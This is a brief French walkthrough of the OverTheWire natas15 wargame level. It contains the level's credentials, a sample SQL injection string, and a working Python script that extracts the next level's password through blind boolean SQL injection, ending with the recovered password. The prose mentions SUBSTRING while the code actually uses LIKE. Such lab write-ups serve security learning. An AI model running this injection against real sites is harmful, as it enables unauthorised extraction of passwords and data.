username : natas15
password : SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

- On arrive sur un formulaire avec du php et du SQL 
- On essaye l'injection classique : ```sql " OR "1"="1 ```
- Cela retourne This Users Exist.
- On va donc faire un script python pour faire de l'injection en SUBSTRING et BINARY 
```python 
import requests
import string

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = ('natas15', 'le_mot_de_passe_du_niveau_precedent')
chars = string.ascii_letters + string.digits

password = ""
while True:
    for char in chars:
        payload = f'natas16" AND BINARY password LIKE "{password}{char}%'
        data = {"username": payload}
        r = requests.post(url, auth=auth, data=data)
        if "This user exists" in r.text:
            password += char
            print(f"Password trouvé jusqu'à présent : {password}")
            break
    else:
        print(f"Mot de passe complet : {password}")
        break
```
- On test chaque caractères 1 par 1 pour construire notre mot de passe. Si le SUBSTRING(pasword,position,position) ne renvoie pas d'erreur alors on l'ajoute a notre variable password.
- A la fin du script on a le mot de passe.
-> Mot de Passe : **hPkjKYviLQctEW33QmuXL6eDVfMW4sGo**
